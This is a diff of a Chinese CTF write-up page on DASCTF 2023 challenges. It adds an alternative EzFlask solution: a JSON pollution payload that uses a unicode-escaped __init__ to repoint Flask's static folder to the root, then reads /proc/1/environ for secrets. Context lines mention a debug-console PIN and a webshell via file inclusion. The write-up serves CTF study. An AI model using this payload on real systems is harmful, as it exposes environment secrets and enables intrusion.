@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EzFlask"><span class="toc-text">EzFlask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-cms"><span class="toc-text">ez_cms</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EzFlask"><span class="toc-text">EzFlask</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F-%E6%B1%A1%E6%9F%93-static-folder%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">非预期 (污染_static_folder获取环境变量)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-cms"><span class="toc-text">ez_cms</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MyPicDisk"><span class="toc-text">MyPicDisk</span></a></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -228,7 +228,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.2k字</span>
+        <span class="post-count">1.3k字</span>
       </span>
     </span>
 
@@ -237,7 +237,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">6分</span>
       </span>
     </span>
     
@@ -431,6 +431,17 @@ rv <span class="token operator">=</span> <span class="token boolean">None</span>
 <p>得到pin码为414-002-214</p>
 <p>进入&#x2F;console页面输入pin码即可实现命令执行获取flag</p>
 <p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230725150856845.png" alt="image-20230725150856845"></p>
+<h2 id="非预期-污染-static-folder获取环境变量"><a href="#非预期-污染-static-folder获取环境变量" class="headerlink" title="非预期 (污染_static_folder获取环境变量)"></a>非预期 (污染_static_folder获取环境变量)</h2><p>By Boogipop</p>
+<p>unicode绕过<code>__init__</code>过滤，修改<code>_static_folder</code>为根目录，然后进行目录穿越</p>
+<blockquote>
+<p><code>_static_folder</code>即静态文件的位置，我们正常只能访问这个位置下的所有文件</p>
+</blockquote>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init\u005f_"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token property">"username"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>
+<span class="token property">"password"</span><span class="token operator">:</span><span class="token number">1</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后访问&#x2F;static&#x2F;proc&#x2F;1&#x2F;environ获取环境变量</p>
 <hr>
 <h1 id="ez-cms"><a href="#ez-cms" class="headerlink" title="ez_cms"></a>ez_cms</h1><blockquote>
 <p>熊海cms+pearcmd</p>
@@ -457,7 +468,7 @@ rv <span class="token operator">=</span> <span class="token boolean">None</span>
 <p>再文件包含执行一句话木马即可</p>
 <p><img src="/blog/2023/07/25/DASCTF-2023-0X401/image-20230804191652987.png" alt="image-20230804191652987"></p>
 <hr>
-
+<h1 id="MyPicDisk"><a href="#MyPicDisk" class="headerlink" title="MyPicDisk"></a>MyPicDisk</h1>
     </div>
     
     
